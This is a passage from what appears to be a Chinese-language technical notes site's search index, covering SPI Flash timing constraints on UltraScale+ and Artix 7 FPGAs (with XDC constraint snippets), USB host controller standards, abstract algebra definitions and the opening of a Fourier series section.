\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6b63\u5e38\u200b\u901a\u8baf\u200b\u4e86\u200b\u3002\u200b\u8fd9\u91cc\u200b\u6bd4\u8f83\u200b\u7ed5\u200b\u7684\u200b\u5c31\u662f\u200b\u65f6\u95f4\u8f74\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u548c\u200b\u5e73\u5e38\u200b\u601d\u8003\u200b\u7684\u200b\u65b9\u5411\u200b\u662f\u200b\u53cd\u8fc7\u6765\u200b\u7684\u200b\u3002\u200b\u800c\u4e14\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b min \u200b\u548c\u200b max \u200b\u5e76\u200b\u4e0d\u662f\u200b\u6307\u200b \\([\\min, \\max]\\)\uff0c\u200b\u800c\u662f\u200b \\((-\\inf, \\min] \\cup [\\max, \\inf)\\)\u3002\u200b\u4ee3\u5165\u200b\u4e0a\u9762\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(\\max=2.05, \\min=-2.95, t_0 \\in (\\inf, -2.95] \\cup [2.05, \\inf)\\)\u3002\u200b\u5982\u679c\u200b\u53d8\u5316\u200b\u7684\u200b\u65f6\u523b\u200b\u8ddd\u79bb\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u592a\u200b\u63a5\u8fd1\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5728\u200b SPI Flash \u200b\u4fa7\u200b\u51fa\u73b0\u200b\u4e0d\u200b\u6ee1\u8db3\u200b setup \u200b\u6216\u8005\u200b hold \u200b\u7ea6\u675f\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6362\u4e2a\u200b\u89d2\u5ea6\u200b\u6765\u200b\u7406\u89e3\u200b min \u200b\u548c\u200b max\uff1a\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u949f\u200b\u548c\u200b\u6570\u636e\u200b\u6765\u8bf4\u200b\uff0c\u200b\u6570\u636e\u200b\u76f8\u5bf9\u200b\u65f6\u949f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u4e0d\u80fd\u200b\u592a\u5c0f\u200b\uff0c\u200b\u81f3\u5c11\u200b\u8981\u200b\u6ee1\u8db3\u200b hold\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u6700\u5c0f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff1b\u200b\u540c\u65f6\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u4e0d\u80fd\u200b\u592a\u200b\u5927\u200b\uff0c\u200b\u6700\u200b\u591a\u200b\u9700\u8981\u200b\u6ee1\u8db3\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b setup\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u6700\u5927\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u5982\u679c\u200b\u4ece\u200b\u8fd9\u4e2a\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\u5ef6\u8fdf\u200b\u5728\u200b\u4e00\u4e2a\u200b \\([\\min, \\max]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u5185\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5728\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u9700\u8981\u200b\u628a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u7eb3\u5165\u200b\u5230\u200b \\(\\max\\) \u200b\u7684\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\uff0c\u200b\u6bd4\u5982\u200b \\(\\max=t_c-t_{su}\\)\u3002\u200b\u5982\u679c\u200b\u628a\u200b\u5750\u6807\u8f74\u200b\u4fee\u6539\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u539f\u70b9\u200b\u53d8\u6210\u200b\u539f\u6765\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\uff0cx \u200b\u7684\u200b\u6b63\u200b\u65b9\u5411\u200b\u53d8\u6210\u200b\u53cd\u5411\u200b\uff0c\u200b\u6b64\u65f6\u200b\u516c\u5f0f\u200b\u91cc\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4e0a\u9762\u200b\u7684\u200b\u5f62\u5f0f\u200b\u4e86\u200b\u3002</p>"},{"location":"hardware/spi.html#artix-7","title":"Artix 7 \u200b\u65f6\u5e8f","text":"<p>\u200b\u5bf9\u4e8e\u200b\u66f4\u200b\u5e38\u89c1\u200b\u7684\u200b 7 Series FPGA\uff0c\u200b\u6bd4\u5982\u200b Artix 7\uff0c\u200b\u5b83\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b STARTUPE2 \u200b\u539f\u8bed\u200b\uff0c\u200b\u53ea\u6709\u200b\u65f6\u949f\u200b\u662f\u200b\u901a\u8fc7\u200b STARTUPE2 \u200b\u539f\u8bed\u200b\u7684\u200b USRCCLKO \u200b\u4fe1\u53f7\u200b\u4f20\u9012\u200b\u5230\u200b CCLK \u200b\u5f15\u811a\u200b\u4e0a\u200b\u7684\u200b\uff0c\u200b\u5176\u4ed6\u200b\u6570\u636e\u4fe1\u53f7\u200b\u90fd\u200b\u662f\u200b\u9700\u8981\u200b\u5728\u200b\u9876\u5c42\u200b\u4fe1\u53f7\u200b\u7ed1\u5b9a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5f15\u811a\u200b\u3002\u200b\u5728\u200b AXI Quad SPI \u200b\u6587\u6863\u200b\u4e2d\u200b\uff0c\u200b\u63cf\u8ff0\u200b\u4e86\u200b STARTUPE2 \u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u5e8f\u200b\u7ea6\u675f\u200b\uff1a</p> <pre><code># You must provide all the delay numbers\n# CCLK delay is 0.5, 6.7 ns min/max for K7-2; refer Data sheet\n# Consider the max delay for worst case analysis\nset cclk_delay 6.7\n# Following are the SPI device parameters\n# Max Tco\nset tco_max 7\n# Min Tco\nset tco_min 1\n# Setup time requirement\nset tsu 2\n# Hold time requirement\nset th 3\n# Following are the board/trace delay numbers\n# Assumption is that all Data lines are matched\nset tdata_trace_delay_max 0.25\nset tdata_trace_delay_min 0.25\nset tclk_trace_delay_max 0.2\nset tclk_trace_delay_min 0.2\n### End of user provided delay numbers\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u548c\u200b\u4e0a\u9762\u200b UltraScale+ \u200b\u90e8\u5206\u200b\u5dee\u4e0d\u591a\u200b\uff0c\u200b\u53ea\u662f\u200b\u591a\u200b\u4e00\u4e2a\u200b <code>cclk_delay</code> \u200b\u53d8\u91cf\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b Artix 7 \u200b\u4e2d\u200b\uff0c\u200b\u65f6\u949f\u200b\u53ea\u80fd\u200b\u521b\u5efa\u200b\u5230\u200b USRCCLKO \u200b\u5f15\u811a\u200b\u4e0a\u200b\u3002\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b SPI Flash \u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u65f6\u949f\u200b\uff0c\u200b\u9996\u5148\u200b\u4ece\u200b USRCCLKO \u200b\u5230\u200b CCLK \u200b\u5f15\u811a\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u901a\u8fc7\u200b PCB \u200b\u4e0a\u200b\u7684\u200b\u7ebf\u200b\u4f20\u64ad\u200b\u5230\u200b SPI Flash\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u504f\u79fb\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u504f\u79fb\u200b\u5c31\u662f\u200b USRCCLKO \u200b\u5230\u200b CCLK \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b Artix 7 Data Sheet \u200b\u91cc\u9762\u200b\u770b\u5230\u200b\uff1a\u200b\u5bf9\u4e8e\u200b 1.0V\uff0c-2 \u200b\u901f\u5ea6\u200b\u7684\u200b FPGA\uff0c\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u6700\u5c0f\u503c\u200b\u4e3a\u200b 0.50ns\uff0c\u200b\u6700\u5927\u503c\u200b\u4e3a\u200b 6.70ns\uff0c\u200b\u8fd9\u91cc\u200b\u91c7\u7528\u200b\u4e86\u200b\u6700\u5927\u503c\u200b\u3002</p> <p>\u200b\u5269\u4e0b\u200b\u7684\u200b\u7ea6\u675f\u200b\uff0c\u200b\u9664\u4e86\u200b\u65f6\u949f\u200b\u90e8\u5206\u200b\u4ee5\u5916\u200b\uff0c\u200b\u548c\u200b\u4e0a\u9762\u200b\u5206\u6790\u200b\u7684\u200b UltraScale+ \u200b\u65f6\u5e8f\u200b\u7ea6\u675f\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u3002\u200b\u4e0d\u540c\u70b9\u200b\u5728\u4e8e\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7ea6\u675f\u200b\u4e86\u200b\u4ece\u200b AXI Quad SPI \u200b\u5230\u200b STARTUPE2 \u200b\u7684\u200b\u8def\u7531\u200b\u65f6\u5ef6\u200b\uff0c\u200b\u4ece\u200b 0.1ns \u200b\u5230\u200b 1.5ns\uff0c\u200b\u7136\u540e\u200b\u53c8\u200b\u4ece\u200b USRCCLKO \u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5206\u9891\u200b + \u200b\u5ef6\u8fdf\u200b <code>cclk_delay</code> \u200b\u7eb3\u79d2\u200b\u7684\u200b\u65f6\u949f\u200b\uff0c\u200b\u4f5c\u4e3a\u200b SPI Flash \u200b\u4e0a\u200b SCK \u200b\u5f15\u811a\u200b\u7684\u200b\u65f6\u949f\u200b\u3002</p> <pre><code># this is to ensure min routing delay from SCK generation to STARTUP input\n# User should change this value based on the results\n# having more delay on this net reduces the Fmax\nset_max_delay 1.5 -from [get_pins -hier *SCK_O_reg_reg/C] -to [get_pins -hier\n*USRCCLKO] -datapath_only\nset_min_delay 0.1 -from [get_pins -hier *SCK_O_reg_reg/C] -to [get_pins -hier\n*USRCCLKO]\n# Following command creates a divide by 2 clock\n# It also takes into account the delay added by STARTUP block to route the CCLK\ncreate_generated_clock -name clk_sck -source [get_pins -hierarchical\n*axi_quad_spi_1/ext_spi_clk] [get_pins -hierarchical *USRCCLKO] -edges {3 5 7}\n-edge_shift [list $cclk_delay $cclk_delay $cclk_delay]\n# Data is captured into FPGA on the second rising edge of ext_spi_clk after the SCK\nfalling edge\n\n# Data is driven by the FPGA on every alternate rising_edge of ext_spi_clk\nset_input_delay -clock clk_sck -max [expr $tco_max + $tdata_trace_delay_max +\n$tclk_trace_delay_max] [get_ports IO*_IO] -clock_fall;\nset_input_delay -clock clk_sck -min [expr $tco_min + $tdata_trace_delay_min +\n$tclk_trace_delay_min] [get_ports IO*_IO] -clock_fall;\nset_multicycle_path 2 -setup -from clk_sck -to [get_clocks -of_objects [get_pins\n-hierarchical */ext_spi_clk]]\nset_multicycle_path 1 -hold -end -from clk_sck -to [get_clocks -of_objects [get_pins\n-hierarchical */ext_spi_clk]]\n# Data is captured into SPI on the following rising edge of SCK\n# Data is driven by the IP on alternate rising_edge of the ext_spi_clk\nset_output_delay -clock clk_sck -max [expr $tsu + $tdata_trace_delay_max -\n$tclk_trace_delay_min] [get_ports IO*_IO];\nset_output_delay -clock clk_sck -min [expr $tdata_trace_delay_min - $th -\n$tclk_trace_delay_max] [get_ports IO*_IO];\nset_multicycle_path 2 -setup -start -from [get_clocks -of_objects [get_pins\n-hierarchical */ext_spi_clk]] -to clk_sck\nset_multicycle_path 1 -hold -from [get_clocks -of_objects [get_pins -hierarchical */\next_spi_clk]] -to clk_sck\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b Artix 7 \u200b\u4e0a\u200b\u914d\u7f6e\u200b STARTUP SPI Flash \u200b\u7684\u200b\u4f8b\u5b50\u200b io_timings.xdc \u200b\u53ef\u4f9b\u53c2\u8003\u200b\u3002</p>"},{"location":"hardware/usb_hci.html","title":"USB Host Controller Interface","text":"<p>USB \u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u63a5\u53e3\u6807\u51c6\u200b\uff1a</p> <ul> <li>OHCI: Open Host Controller Interface, USB 1.1</li> <li>UHCI: Universal Host Controller Interface by Intel, USB 1.1</li> <li>EHCI: Enhanced Host Controller Interface, USB 2.0</li> <li>xHCI: eXtensible Host Controller Interface, USB 1.1-3.0</li> <li>VHCI: Virtual Host Controller Interface for USB/IP</li> </ul>"},{"location":"mathematics/abstract-algebra.html","title":"\u62bd\u8c61\u4ee3\u6570","text":""},{"location":"mathematics/abstract-algebra.html#_2","title":"\u7fa4","text":"<p>\u200b\u8bbe\u200b \\(G\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u96c6\u5408\u200b\uff0c\u200b\u5728\u200b G \u200b\u4e0a\u200b\u5b9a\u4e49\u200b\u4e00\u4e2a\u4e8c\u5143\u200b\u8fd0\u7b97\u200b \\(*\\)\u3002\u200b\u5982\u679c\u200b\u6ee1\u8db3\u200b\u5c01\u95ed\u6027\u200b\u548c\u200b\u7ed3\u5408\u5f8b\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(G\\) \u200b\u662f\u200b\u534a\u7fa4\u200b\uff1b\u200b\u5982\u679c\u200b\u6ee1\u8db3\u200b\u5c01\u95ed\u6027\u200b\u3001\u200b\u7ed3\u5408\u5f8b\u200b\u548c\u200b\u5e7a\u200b\u5143\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(G\\) \u200b\u662f\u200b\u542b\u200b\u5e7a\u200b\u534a\u7fa4\u200b\uff1b\u200b\u5982\u679c\u200b\u6ee1\u8db3\u200b\u5c01\u95ed\u6027\u200b\u3001\u200b\u7ed3\u5408\u5f8b\u200b\u3001\u200b\u5e7a\u200b\u5143\u200b\u548c\u200b\u9006\u5143\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(G\\) \u200b\u662f\u200b\u7fa4\u200b\u3002</p> <p>\u200b\u8bbe\u200b \\(S\\) \u200b\u662f\u200b\u7fa4\u200b \\(G\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u5b50\u200b\u96c6\u200b\uff0c\u200b\u82e5\u200b \\(S\\) \u200b\u5bf9\u200b \\(G\\) \u200b\u7684\u200b\u8fd0\u7b97\u200b\u4e5f\u200b\u6784\u6210\u200b\u7fa4\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(S\\) \u200b\u662f\u200b \\(G\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b50\u7fa4\u200b\uff08subgroup\uff09\uff0c\u200b\u8bb0\u200b\u4f5c\u200b \\(S \\le G\\)\u3002</p> <p>\u200b\u8bbe\u200b \\((G, *)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7fa4\u200b\uff0c\\(H \\le G, a \\in G\\)\uff0c\u200b\u5219\u200b \\(aH\\) \u200b\u79f0\u4e3a\u200b \\(H\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5de6\u200b\u966a\u96c6\u200b\uff08left coset\uff09\uff0c\\(Ha\\) \u200b\u79f0\u4e3a\u200b \\(H\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u53f3\u200b\u966a\u96c6\u200b\u3002</p> <p>\u200b\u8bbe\u200b \\(G\\) \u200b\u662f\u200b\u7fa4\u200b\uff0c\\(H \\le G\\)\uff0c\u200b\u82e5\u200b \\(\\forall g \\in G, gH=Hg\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(H\\) \u200b\u662f\u200b \\(G\\) \u200b\u7684\u200b\u6b63\u89c4\u200b\u5b50\u7fa4\u200b\uff08normal subgroup\uff09\uff0c\u200b\u5e76\u200b\u8bb0\u4f5c\u200b \\(H \\unlhd G\\)\u3002</p> <p>\u200b\u8bbe\u200b \\(H \\unlhd G\\)\uff0c\u200b\u90a3\u4e48\u200b\u5de6\u200b\u966a\u96c6\u200b\u548c\u200b\u53f3\u200b\u966a\u96c6\u200b\u76f8\u7b49\u200b\uff0c\\(G\\) \u200b\u5173\u4e8e\u200b \\(H\\) \u200b\u7684\u200b\u966a\u96c6\u200b\u96c6\u5408\u200b\uff0c\u200b\u8bb0\u200b\u4f5c\u200b \\(G/H\\)\uff0c\u200b\u8fd9\u4e2a\u200b\u96c6\u5408\u200b\u5173\u4e8e\u200b\u5b50\u96c6\u200b\u4e58\u6cd5\u200b\u6784\u6210\u200b\u7fa4\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b \\(G\\) \u200b\u5173\u4e8e\u200b \\(H\\) \u200b\u751f\u6210\u200b\u7684\u200b\u5546\u7fa4\u200b\uff08quotient group\uff09\u3002</p> <p>\u200b\u82e5\u7fa4\u200b \\(G \\ne \\{e\\}\\)\uff0c\\(G\\) \u200b\u4e2d\u200b\u9664\u4e86\u200b\u5e73\u51e1\u200b\u5b50\u7fa4\u200b\u4ee5\u5916\u200b\uff0c\u200b\u6ca1\u6709\u200b\u5176\u4ed6\u200b\u7684\u200b\u6b63\u89c4\u200b\u5b50\u7fa4\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(G\\) \u200b\u662f\u200b\u5355\u7fa4\u200b\uff08simple group\uff09\u3002\u200b\u6240\u6709\u200b\u7684\u200b\u6709\u9650\u200b\u5355\u7fa4\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u627e\u5230\u200b\u3002</p> <p>\u200b\u8bbe\u200b \\(G\\) \u200b\u662f\u200b\u7fa4\u200b\uff0c\\(a, b \\in G\\)\uff0c\u200b\u82e5\u200b\u5b58\u5728\u200b \\(g \\in G, gag^{-1}=b\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(a\\) \u200b\u4e0e\u200b \\(b\\) \u200b\u5171\u8f6d\u200b\u3002\u200b\u5171\u8f6d\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b49\u4ef7\u5173\u7cfb\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u7ebf\u6027\u4ee3\u6570\u200b\u4e2d\u200b\u7684\u200b\u76f8\u4f3c\u200b\u3002\u200b\u4ece\u200b\u7b49\u4ef7\u5173\u7cfb\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u7b49\u4ef7\u200b\u7c7b\u200b\uff0c\u200b\u5373\u200b\u5171\u8f6d\u200b\u7c7b\u200b\uff0c\u200b\u8bb0\u200b\u4f5c\u200b \\(K_a=\\{gag^{-1}|g \\in G\\}\\)</p>"},{"location":"mathematics/abstract-algebra.html#_3","title":"\u73af","text":"<p>\u200b\u8bbe\u200b \\(A\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u96c6\u5408\u200b\uff0c\u200b\u5728\u200b \\(A\\) \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u4e24\u79cd\u200b\u4e8c\u5143\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u4e00\u79cd\u200b\u53eb\u505a\u200b\u52a0\u6cd5\u200b\uff0c\u200b\u53e6\u200b\u4e00\u79cd\u200b\u53eb\u505a\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u4e14\u200b\u6ee1\u8db3\u200b</p> <ul> <li>\\((A,+)\\) \u200b\u662f\u200b\u53ef\u6362\u200b\u7fa4\u200b\uff1a\u200b\u5c01\u95ed\u6027\u200b\uff0c\u200b\u7ed3\u5408\u5f8b\u200b\uff0c\u200b\u5e7a\u200b\u5143\u200b\uff0c\u200b\u9006\u5143\u200b\uff0c\u200b\u4ea4\u6362\u5f8b\u200b</li> <li>\\((A,*)\\) \u200b\u662f\u200b\u534a\u7fa4\u200b\uff1a\u200b\u5c01\u95ed\u6027\u200b\uff0c\u200b\u7ed3\u5408\u5f8b\u200b</li> <li>\u200b\u5de6\u53f3\u200b\u5206\u914d\u5f8b\u200b\u6210\u7acb\u200b\uff1a\\(a(b+c)=ab+ac, (a+b)c=ac+bc\\)</li> </ul> <p>\u200b\u5219\u200b\u79f0\u200b \\((A,+,*)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u73af\u200b\uff08ring\uff09\u3002\u200b\u5982\u679c\u200b \\((A,+,*)\\) \u200b\u5bf9\u200b\u4e58\u6cd5\u200b\u4e5f\u200b\u662f\u200b\u53ef\u200b\u4ea4\u6362\u200b\u7684\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(A\\) \u200b\u4e3a\u200b\u53ef\u6362\u200b\u73af\u200b\u3002</p> <p>\u200b\u8bbe\u200b \\((A, +, *)\\) \u200b\u662f\u200b\u73af\u200b\uff0c\u200b\u82e5\u200b \\(A \\ne \\{0\\}\\)\uff0c\u200b\u53ef\u200b\u4ea4\u6362\u200b\uff0c\u200b\u4e14\u200b\u65e0\u200b\u96f6\u200b\u56e0\u5b50\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(A\\) \u200b\u662f\u200b\u6574\u73af\u200b\uff08domain\uff09\u3002</p> <p>\u200b\u82e5\u200b \\(A\\) \u200b\u6ee1\u8db3\u200b\uff1a</p> <ul> <li>\\(A\\) \u200b\u4e2d\u200b\u81f3\u5c11\u200b\u6709\u200b\u4e24\u4e2a\u200b\u5143\u200b \\(0\\) \u200b\u548c\u200b \\(1\\)</li> <li>\\(A^*=A \\backslash \\{0\\}\\) \u200b\u6784\u6210\u200b\u4e58\u6cd5\u200b\u7fa4\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u534a\u7fa4\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8981\u6c42\u200b\u5e7a\u200b\u5143\u200b\u548c\u200b\u9006\u5143\u200b\u5b58\u5728\u200b</li> </ul> <p>\u200b\u5219\u200b\u79f0\u200b \\(A\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u9664\u73af\u200b\uff08division ring\uff09\u3002</p> <p>\u200b\u82e5\u200b \\(A\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u53ef\u6362\u200b\u7684\u200b\u9664\u73af\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(A\\) \u200b\u662f\u57df\u200b\uff08field\uff09\u3002</p> <p>\u200b\u8bbe\u200b \\((A, +, *)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u73af\u200b\uff0c\\(S\\) \u200b\u662f\u200b \\(A\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u5b50\u200b\u96c6\u200b\uff0c\u200b\u82e5\u200b \\(S\\) \u200b\u5bf9\u200b \\(+\\) \u200b\u548c\u200b \\(*\\) \u200b\u4e5f\u200b\u6784\u6210\u200b\u4e00\u4e2a\u200b\u73af\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(S\\) \u200b\u662f\u200b \\(A\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b50\u73af\u200b\uff08ring\uff09\uff0c\\(A\\) \u200b\u662f\u200b \\(S\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u6269\u73af\u200b\uff08extension ring\uff09\u3002</p> <p>\u200b\u8bbe\u200b \\(A\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u73af\u200b\uff0c\\(I\\) \u200b\u662f\u200b\u5b83\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b50\u73af\u200b\uff0c\u200b\u5bf9\u200b\u4efb\u610f\u200b\u7684\u200b \\(a \\in I\\) \u200b\u548c\u200b\u4efb\u610f\u200b \\(x \\in A\\)\uff0c\u200b\u82e5\u200b\u6ee1\u8db3\u200b \\(xa \\in I\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(I\\) \u200b\u662f\u200b \\(A\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5de6\u7406\u60f3\u200b\uff08left ideal\uff09\uff1b\u200b\u82e5\u200b\u6ee1\u8db3\u200b \\(ax \\in I\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(I\\) \u200b\u662f\u200b \\(A\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u53f3\u200b\u7406\u60f3\u200b\uff08right ideal\uff09\u3002\u200b\u82e5\u200b\u540c\u65f6\u200b\u6ee1\u8db3\u200b \\(xa \\in I, ax \\in I\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(I\\) \u200b\u662f\u200b \\(A\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u7406\u60f3\u200b\uff08ideal\uff09\uff0c\u200b\u79f0\u4e3a\u200b \\(I\\) \u200b\u5bf9\u200b \\(A\\) \u200b\u662f\u200b\u5438\u6536\u200b\u7684\u200b\u3002</p>"},{"location":"mathematics/abstract-algebra.html#_4","title":"\u57df","text":"<p>\u200b\u8bbe\u200b \\((K, +, *)\\) \u200b\u662f\u57df\u200b\uff0c\\(F\\) \u200b\u662f\u200b \\(K\\) \u200b\u7684\u200b\u975e\u200b\u7a7a\u5b50\u200b\u96c6\u200b\uff0c\u200b\u4e14\u200b \\((F, +, *)\\) \u200b\u4e5f\u200b\u662f\u200b\u57df\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(F\\) \u200b\u662f\u200b \\(K\\) \u200b\u7684\u200b\u5b50\u57df\u200b\uff08subfield\uff09\uff0c\\(K\\) \u200b\u662f\u200b \\(F\\) \u200b\u7684\u200b\u6269\u57df\u200b\uff08extension field\uff09\uff0c\u200b\u8bb0\u200b\u4f5c\u200b \\(F \\le K\\)\u3002</p> <p>\u200b\u8bbe\u200b \\(F\\) \u200b\u662f\u57df\u200b\uff0c\u200b\u82e5\u200b\u5143\u7d20\u200b \\(1\\) \u200b\u5728\u200b \\((F, +)\\) \u200b\u4e2d\u200b\u7684\u200b\u9636\u6570\u200b\u4e3a\u200b\u7d20\u6570\u200b \\(p\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(P\\) \u200b\u4e3a\u200b \\(F\\) \u200b\u7684\u200b\u7279\u5f81\u200b\uff08characteristic\uff09\uff1b\u200b\u82e5\u200b\u5143\u7d20\u200b \\(1\\) \u200b\u5728\u200b \\((F, +)\\) \u200b\u4e2d\u200b\u7684\u200b\u9636\u6570\u200b\u4e3a\u200b\u65e0\u7a77\u5927\u200b\uff0c\u200b\u5219\u200b\u79f0\u200b \\(F\\) \u200b\u7684\u200b\u7279\u5f81\u200b\u4e3a\u200b \\(0\\)\uff0c\\(F\\) \u200b\u7684\u200b\u7279\u5f81\u200b\u8bb0\u200b\u4e3a\u200b \\(\\textrm{ch}F\\)\u3002</p>"},{"location":"mathematics/fourier-transform.html","title":"\u5085\u7acb\u53f6\u200b\u53d8\u6362","text":""},{"location":"mathematics/fourier-transform.html#_2","title":"\u5085\u7acb\u53f6\u200b\u7ea7\u6570","text":"<p>\u200b\u4ee5\u200b \\(P\\) \u200b\u4e3a\u200b\u5468\u671f\u200b\u7684\u200b\u5468\u671f\u51fd\u6570\u200b \\(s(x)\\) \u200b\u53ef\u4ee5\u200b\u5206\u89e3\u200b\u4e3a\u200b\u4e00\u7cfb\u5217\u200b\u4e09\u89d2\u51fd\u6570\u200b\u4e4b\u200b\u548c\u200b\uff1a</p> \\[ s(x) = A_0 + \\sum_{n=1}^{\\infty}(A_n \\cos(\\frac{2 \\pi nx}{P}) + B_n \\sin(\\frac{2 \\pi nx}{P})) \\] <p>\u200b\u4e3a\u4e86\u200b\u8ba1\u7b97\u200b\u7cfb\u6570\u200b \\(A_n\\) \u200b\u548c\u200b \\(B_n\\)\uff0c\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u4e0a\u200b\u8ba1\u7b97\u200b\u5982\u4e0b\u200b\u79ef\u5206\u200b\uff1a</p> \\[\\begin{align} A_0 &amp;= \\frac{1}{P} \\int_P s(x) \\mathrm{d} x \\\\ A_n &amp;= \\frac{2}{P} \\int_P s(x) \\cos(\\frac{2 \\pi nx}{P}) \\mathrm{d} x \\\\ B_n &amp;= \\frac{2}{P} \\int_P s(x) \\sin(\\frac{2 \\pi nx}{P}) \\mathrm{d} x \\end{align}\\] <p>\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u5728\u200b\u8ba1\u7b97\u200b \\(s(x)\\) \u200b\u5728\u200b\u7531\u200b \\(\\cos(\\frac{2 \\pi nx}{P})\\) \u200b\u548c\u200b \\(\\sin(\\frac{2 \\pi nx}{P})\\) 